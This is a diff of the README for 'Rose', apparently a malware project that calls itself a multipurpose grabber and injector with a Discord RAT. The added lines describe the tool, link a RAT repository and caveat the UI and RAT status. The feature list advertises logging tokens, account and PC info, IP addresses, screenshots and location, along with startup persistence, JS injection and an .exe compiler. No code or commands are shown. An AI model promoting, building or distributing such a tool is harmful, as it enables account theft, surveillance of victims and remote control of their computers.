@@ -33,6 +33,7 @@
 </div>
 
 ### A multipurpose advanced injectioner and grabber using a beautiful UI
+### UI might not work for now, a new one will be released soon
 
 ## <a id="content"></a>🌐 〢 Table Of Contents
 
@@ -49,6 +50,10 @@
 - **[⚠️ 〢 Bugs Or Errors](#bugsorerrors)**
 - **[🧾 〢 License](#lisence)**
 
+## <a id="description"></a> 📖 〢 Description
+
+Rose is a powerful multipurposes grabber, injector & include a [RAT](https://github.com/DamagingRose/Rose-RAT)
+
 ## <a id="features"></a> 🔰 〢 Features
 
 - `Logs Token, Pc Info, Account Info and IP`🟢
@@ -59,7 +64,7 @@
 - `Logs Screenshot and locations info`🟢
 - `Start up integration`🟣
 - `JS Injector on startup/actions`🟢
-- `Discord RAT`🟣
+- `Discord RAT`🟣 (still in development but can be used)
 - `UI with Qt5`🟢
 - `UI Integration`🟢
 - `Compiler (.exe)`🟢
